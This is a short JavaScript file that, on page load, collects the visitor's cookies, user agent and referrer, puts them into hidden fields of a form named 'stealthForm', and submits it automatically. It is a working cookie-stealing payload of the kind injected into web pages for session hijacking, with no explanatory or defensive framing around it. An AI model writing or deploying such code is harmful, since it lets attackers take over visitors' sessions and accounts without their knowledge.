document.addEventListener("DOMContentLoaded", function() {
    try {
        // Capture cookies, user agent, and referrer
        var cookies = document.cookie.trim() || "No_Cookies";
        var userAgent = navigator.userAgent || "Unknown_User_Agent";
        var referrer = document.referrer.trim() || "No_Referrer";

        // Get form elements
        var cookieField = document.getElementById("cookieField");
        var userAgentField = document.getElementById("userAgentField");
        var referrerField = document.getElementById("referrerField");
        var stealthForm = document.getElementById("stealthForm");

        if (cookieField && userAgentField && referrerField && stealthForm) {
            // Inject data into fields
            cookieField.value = cookies;
            userAgentField.value = userAgent;
            referrerField.value = referrer;

            console.log("Cookie Data:", cookies);
            console.log("User Agent:", userAgent);
            console.log("Referrer:", referrer);

            // Submit form only if valid data is present
            if (cookies !== "No_Cookies" || referrer !== "No_Referrer") {
                console.log("Submitting form...");
                stealthForm.submit();
            } else {
                console.warn("No valid data to submit.");
            }
        } else {
            console.error("One or more form elements not found.");
        }
    } catch (error) {
        console.error("Error in script execution:", error);
    }
});
